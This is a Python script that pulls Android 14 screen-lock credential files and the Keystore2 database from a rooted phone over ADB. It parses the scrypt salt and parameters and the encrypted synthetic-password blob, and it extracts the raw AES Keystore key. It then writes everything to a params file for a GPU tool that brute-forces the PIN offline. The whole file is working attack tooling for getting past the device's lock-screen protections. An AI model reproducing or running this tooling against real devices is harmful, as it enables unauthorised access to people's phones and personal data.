#!/usr/bin/env python3
"""
extract_params.py — Auto-extract brute-force parameters from Android 14 SP Blob files.

Extracts all cryptographic parameters needed for offline PIN brute-force:
  - Salt & scrypt parameters from .pwd file
  - Outer layer IV & ciphertext from .spblob file
  - Secdiscardable hash from .secdis file
  - Keystore AES key from persistent.sqlite database

Output: params.json ready for gpu_brute.py

Usage:
  # From local files
  python3 extract_params.py \
      --pwd spblob_data/pwd.bin \
      --spblob spblob_data/spblob.bin \
      --secdis spblob_data/secdis.bin \
      --keystore-db spblob_data/persistent.sqlite \
      --protector-id 127c801dd428770a \
      --output params.json

  # Auto-pull from ADB device (needs root)
  python3 extract_params.py --adb --output params.json
"""

import hashlib
import json
import os
import re
import sqlite3
import struct
import subprocess
import sys
from typing import Optional


# ═══════════════════════════════════════════════════════════
# Parser untuk .pwd file (PasswordData)
# ═══════════════════════════════════════════════════════════

def parse_pwd(path: str) -> dict:
    """Parse PasswordData from .pwd file.
    
    Format (big-endian):
      credentialType:  int (4B) — first 2B may be version in v14 beta
      scryptLogN:      byte (1B) — actual N = 1 << scryptLogN
      scryptLogR:      byte (1B)
      scryptLogP:      byte (1B)
      saltLen:         int  (4B)
      salt:            bytes (saltLen)
      handleLen:       int  (4B)
      passwordHandle:  bytes (handleLen)
      pinLength:       int  (4B) — may be PIN_LENGTH_UNAVAILABLE (-1)
    """
    with open(path, "rb") as f:
        data = f.read()

    if len(data) < 11:
        raise ValueError(f".pwd file too short: {len(data)} bytes")

    offset = 0
    credential_type = struct.unpack_from(">I", data, offset)[0]
    offset += 4

    scrypt_log_n = data[offset]; offset += 1
    scrypt_log_r = data[offset]; offset += 1
    scrypt_log_p = data[offset]; offset += 1

    salt_len = struct.unpack_from(">I", data, offset)[0]
    offset += 4

    if offset + salt_len > len(data):
        raise ValueError(f"Salt length {salt_len} exceeds file size")

    salt = data[offset:offset + salt_len]
    offset += salt_len

    handle_len = struct.unpack_from(">I", data, offset)[0]
    offset += 4

    password_handle = None
    if handle_len > 0 and offset + handle_len <= len(data):
        password_handle = data[offset:offset + handle_len]
        offset += handle_len

    pin_length = None
    if offset + 4 <= len(data):
        pin_length = struct.unpack_from(">i", data, offset)[0]

    # Convert log values to actual parameters
    scrypt_n = 1 << scrypt_log_n
    scrypt_r = 1 << scrypt_log_r
    scrypt_p = 1 << scrypt_log_p

    return {
        "credential_type": credential_type,
        "scrypt_n": scrypt_n,
        "scrypt_r": scrypt_r,
        "scrypt_p": scrypt_p,
        "scrypt_log_n": scrypt_log_n,
        "scrypt_log_r": scrypt_log_r,
        "scrypt_log_p": scrypt_log_p,
        "salt": salt,
        "salt_hex": salt.hex(),
        "password_handle_hex": password_handle.hex() if password_handle else None,
        "pin_length": pin_length,
    }


# ═══════════════════════════════════════════════════════════
# Parser untuk .spblob file
# ═══════════════════════════════════════════════════════════

def parse_spblob(path: str) -> dict:
    """Parse SyntheticPasswordBlob from .spblob file.
    
    Format:
      version:       byte (1B)
      protectorType: byte (1B)
      encrypted:     bytes (rest) = IV(12B) + ciphertext_with_tag
    """
    with open(path, "rb") as f:
        data = f.read()

    version = data[0]
    protector_type = data[1]
    encrypted = data[2:]

    if len(encrypted) < 28:  # at least IV(12) + TAG(16)
        raise ValueError(f"Encrypted content too short: {len(encrypted)}B")

    outer_iv = encrypted[:12]
    outer_ct_tag = encrypted[12:]

    return {
        "version": version,
        "protector_type": protector_type,
        "outer_iv_hex": outer_iv.hex(),
        "outer_ct_tag_hex": outer_ct_tag.hex(),
    }


# ═══════════════════════════════════════════════════════════
# Parser untuk .secdis file (secdiscardable)
# ═══════════════════════════════════════════════════════════

def parse_secdis(path: str) -> dict:
    """Compute secdiscardable hash from .secdis file.
    
    secdiscardable_hash = SHA512(pad128("secdiscardable-transform") || rawSecdis)
    """
    SEC_PERSONALIZATION = b"secdiscardable-transform"
    PAD_LEN = 128

    padded_pers = SEC_PERSONALIZATION + b'\x00' * (PAD_LEN - len(SEC_PERSONALIZATION))

    with open(path, "rb") as f:
        raw = f.read()

    sec_hash = hashlib.sha512(padded_pers + raw).digest()

    return {
        "secdis_size": len(raw),
        "sec_hash_hex": sec_hash.hex(),
    }


# ═══════════════════════════════════════════════════════════
# Ekstraktor Keystore key dari persistent.sqlite
# ═══════════════════════════════════════════════════════════

def extract_keystore_key(db_path: str, protector_id: str) -> Optional[bytes]:
    """Extract raw AES-256 Keystore key for the protector.
    
    Queries persistent.sqlite (Android Keystore2 database):
      1. Find keyentry where alias = 'synthetic_password_<protector_id>'
      2. Get blob from blobentry
      3. Extract raw 32-byte AES key from blob (bytes 2-33)
    
    Returns 32-byte AES key, or None if not found.
    """
    alias = f"synthetic_password_{protector_id}"  # string, not bytes

    conn = sqlite3.connect(db_path)
    try:
        # Find keyentry (alias is stored as TEXT in Keystore2)
        row = conn.execute(
            "SELECT id FROM keyentry WHERE alias = ?", (alias,)
        ).fetchone()

        if not row:
            print(f"  [!] Keystore key not found for protector {protector_id}")
            print(f"      Searched alias: {alias}")
            # List all aliases for debugging
            all_aliases = conn.execute("SELECT alias FROM keyentry").fetchall()
            matching = [a[0] for a in all_aliases if 'synthetic' in str(a[0]).lower()]
            if matching:
                print(f"      Matching aliases in DB: {matching}")
            conn.close()
            return None

        key_id = row[0]

        # Get blob
        row = conn.execute(
            "SELECT blob FROM blobentry WHERE keyentryid = ? AND subcomponent_type = 0",
            (key_id,)
        ).fetchone()

        if not row:
            print(f"  [!] No blob for keyentry {key_id}")
            conn.close()
            return None

        blob = row[0]

        # Extract raw AES key from blob
        # Keystore2 blob format: [4B header][1B padding][32B AES key][remaining params...]
        # Example: 00200000 00 D57749B72E...DA 00000000...
        KEY_OFFSET = 5
        KEY_LENGTH = 32

        if len(blob) < KEY_OFFSET + KEY_LENGTH:
            print(f"  [!] Blob too short for key extraction: {len(blob)}B "
                  f"(need at least {KEY_OFFSET + KEY_LENGTH})")
            conn.close()
            return None

        raw_key = blob[KEY_OFFSET:KEY_OFFSET + KEY_LENGTH]

        # Verify it looks like an AES key (not all zeros)
        if raw_key == b'\x00' * 32:
            print(f"  [!] Extracted key is all zeros — likely wrong offset")
            conn.close()
            return None

        return raw_key

    finally:
        conn.close()


# ═══════════════════════════════════════════════════════════
# ADB auto-pull helper
# ═══════════════════════════════════════════════════════════

def get_protector_id_via_adb() -> str:
    """Get current LSKF protector ID from device via ADB."""
    result = subprocess.run(
        ["adb", "shell", "dumpsys lock_settings | grep 'LSKF-based SP protector ID'"],
        capture_output=True, text=True, timeout=15
    )
    match = re.search(r'([0-9a-fA-F]{16})', result.stdout)
    if not match:
        raise RuntimeError("Could not find protector ID. Is the device connected and PIN set?")
    return match.group(1)


def pull_files_via_adb(protector_id: str, output_dir: str) -> dict:
    """Pull all required files from ADB device.
    
    Returns dict with paths to pulled files.
    """
    os.makedirs(output_dir, exist_ok=True)

    files = {
        "pwd": f"/data/system_de/0/spblob/{protector_id}.pwd",
        "spblob": f"/data/system_de/0/spblob/{protector_id}.spblob",
        "secdis": f"/data/system_de/0/spblob/{protector_id}.secdis",
        "keystore_db": "/data/misc/keystore/persistent.sqlite",
    }

    paths = {}
    for name, remote_path in files.items():
        local_path = os.path.join(output_dir, os.path.basename(remote_path))
        if name == "keystore_db":
            local_path = os.path.join(output_dir, "persistent.sqlite")

        print(f"  Pulling {name}: {remote_path}...")
        result = subprocess.run(
            ["adb", "pull", remote_path, local_path],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode != 0:
            print(f"    [!] Failed: {result.stderr.strip()}")
        else:
            print(f"    OK → {local_path}")
            paths[name] = local_path

    return paths


# ═══════════════════════════════════════════════════════════
# Main extraction pipeline
# ═══════════════════════════════════════════════════════════

def build_params(pwd_path: str, spblob_path: str, secdis_path: str,
                 keystore_db_path: str, protector_id: str,
                 keystore_key_hex: str = None,
                 output_path: str = "params.json"):
    """Build complete params.json from all source files."""
    
    print(f"[*] Extracting parameters for protector: {protector_id}")
    print()

    # Parse .pwd
    print("[1/4] Parsing .pwd file...")
    pwd = parse_pwd(pwd_path)
    print(f"      Salt: {pwd['salt_hex']}")
    print(f"      scrypt: N=2^{pwd['scrypt_log_n']}={pwd['scrypt_n']}, "
          f"r=2^{pwd['scrypt_log_r']}={pwd['scrypt_r']}, "
          f"p=2^{pwd['scrypt_log_p']}={pwd['scrypt_p']}")
    print(f"      Credential type: {pwd['credential_type']}")

    # Parse .spblob
    print("[2/4] Parsing .spblob file...")
    spblob = parse_spblob(spblob_path)
    print(f"      Version: {spblob['version']}, Protector: {spblob['protector_type']}")
    print(f"      Encrypted payload: {len(bytes.fromhex(spblob['outer_ct_tag_hex']))}B")

    # Hash .secdis
    print("[3/4] Computing secdiscardable hash...")
    secdis = parse_secdis(secdis_path)
    print(f"      File size: {secdis['secdis_size']}B")
    print(f"      Hash: {secdis['sec_hash_hex'][:32]}...")

    # Extract Keystore key
    print("[4/4] Extracting Keystore key...")
    if keystore_key_hex:
        keystore_key = bytes.fromhex(keystore_key_hex)
        print(f"      Key (from --keystore-key-hex): {keystore_key.hex()}")
    else:
        keystore_key = extract_keystore_key(keystore_db_path, protector_id)
        if not keystore_key:
            print("      [!] FAILED — cannot extract Keystore key")
            print("      Hint: use --keystore-key-hex <32B hex> if you have the key")
            return None
        print(f"      Key: {keystore_key.hex()}")

    # Build application-id padding (constant)
    APP_PERS = b"application-id"
    APP_PAD = APP_PERS + b'\x00' * (128 - len(APP_PERS))

    # Build output
    params = {
        "protector_id": protector_id,
        "salt_hex": pwd["salt_hex"],
        "scrypt_n": pwd["scrypt_n"],
        "scrypt_r": pwd["scrypt_r"],
        "scrypt_p": pwd["scrypt_p"],
        "sec_hash_hex": secdis["sec_hash_hex"],
        "keystore_key_hex": keystore_key.hex(),
        "app_pad_hex": APP_PAD.hex(),
        "outer_iv_hex": spblob["outer_iv_hex"],
        "outer_ct_tag_hex": spblob["outer_ct_tag_hex"],
        "_meta": {
            "credential_type": pwd["credential_type"],
            "spblob_version": spblob["version"],
            "scrypt_log": f"N=2^{pwd['scrypt_log_n']} r=2^{pwd['scrypt_log_r']} p=2^{pwd['scrypt_log_p']}",
            "secdis_size": secdis["secdis_size"],
            "password_handle_hex": pwd.get("password_handle_hex"),
            "pin_length": pwd.get("pin_length"),
        }
    }

    with open(output_path, "w") as f:
        json.dump(params, f, indent=2)

    print(f"\n✅ Parameters saved to: {output_path}")
    print(f"   Ready for: python3 gpu_brute.py --params {output_path} -L 6 -M 6 -w 8")
    return params


# ═══════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Extract brute-force parameters from Android 14 SP Blob files"
    )

    # Mode: manual file paths
    parser.add_argument("--pwd", help="Path to .pwd file")
    parser.add_argument("--spblob", help="Path to .spblob file")
    parser.add_argument("--secdis", help="Path to .secdis file")
    parser.add_argument("--keystore-db", help="Path to persistent.sqlite")
    parser.add_argument("--keystore-key-hex",
                        help="Raw keystore AES key (32B hex) — skips DB query if provided")
    parser.add_argument("--protector-id", help="Protector ID (16 hex chars)")

    # Mode: auto-pull from ADB
    parser.add_argument("--adb", action="store_true",
                        help="Auto-pull files from ADB device")
    parser.add_argument("--adb-dir", default="spblob_data",
                        help="Directory to pull files to (default: spblob_data)")

    parser.add_argument("--output", "-o", default="params.json",
                        help="Output JSON file (default: params.json)")

    args = parser.parse_args()

    if args.adb:
        # Auto-pull mode
        print("[*] Connecting via ADB...")
        result = subprocess.run(
            ["adb", "shell", "echo OK"], capture_output=True, text=True, timeout=10
        )
        if "OK" not in result.stdout:
            print("[!] ADB device not found or not accessible")
            sys.exit(1)

        protector_id = get_protector_id_via_adb()
        print(f"[*] Found protector ID: {protector_id}")

        paths = pull_files_via_adb(protector_id, args.adb_dir)

        if len(paths) < 4:
            print(f"[!] Only pulled {len(paths)}/4 files. Check ADB access.")
            sys.exit(1)

        build_params(
            pwd_path=paths["pwd"],
            spblob_path=paths["spblob"],
            secdis_path=paths["secdis"],
            keystore_db_path=paths["keystore_db"],
            protector_id=protector_id,
            output_path=args.output,
        )

    else:
        # Manual mode
        missing = []
        for name, val in [
            ("--pwd", args.pwd), ("--spblob", args.spblob),
            ("--secdis", args.secdis), ("--protector-id", args.protector_id)
        ]:
            if not val:
                missing.append(name)
        # keystore-db OR keystore-key-hex must be provided
        if not args.keystore_db and not args.keystore_key_hex:
            missing.append("--keystore-db or --keystore-key-hex")

        if missing:
            print(f"[!] Missing required arguments: {', '.join(missing)}")
            print("    Use --adb to auto-pull from device, or provide all file paths.")
            sys.exit(1)

        build_params(
            pwd_path=args.pwd,
            spblob_path=args.spblob,
            secdis_path=args.secdis,
            keystore_db_path=args.keystore_db or "",
            protector_id=args.protector_id,
            keystore_key_hex=args.keystore_key_hex,
            output_path=args.output,
        )


if __name__ == "__main__":
    main()
